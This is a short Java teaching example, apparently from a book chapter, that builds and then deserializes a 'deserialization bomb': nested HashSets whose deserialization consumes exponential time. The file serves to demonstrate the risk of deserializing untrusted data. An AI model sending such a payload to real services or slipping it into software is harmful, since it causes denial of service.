package com.quecode.chapter12;

import java.io.*;
import java.util.HashSet;
import java.util.Set;

public class DeserializationBomb {
    public static void main(String[] args) throws Exception {
        byte[] bomb = bomb();
        System.out.println(bomb.length);
        deserialize(bomb());
    }

    static byte[] bomb() {
        Set<Object> root = new HashSet<>();
        Set<Object> s1 = root;
        Set<Object> s2 = new HashSet<>();
        for (int i = 0; i < 100; i++) {
            Set<Object> t1 = new HashSet<>();
            Set<Object> t2 = new HashSet<>();
            t1.add("foo"); // t1을 t2와 다르게 만든다.
            s1.add(t1);
            s1.add(t2);
            s2.add(t1);
            s2.add(t2);
            s1 = t1;
            s2 = t2;
        }
        return serialize(root);
    }

    public static byte[] serialize(Object o) {
        ByteArrayOutputStream ba = new ByteArrayOutputStream();
        try {
            new ObjectOutputStream(ba).writeObject(o);
        } catch (IOException e) {
            throw new IllegalArgumentException(e);
        }
        return ba.toByteArray();
    }

    public static Object deserialize(byte[] bytes) {
        try {
            return new ObjectInputStream(
                    new ByteArrayInputStream(bytes)).readObject();
        } catch (IOException | ClassNotFoundException e) {
            throw new IllegalArgumentException(e);
        }
    }
}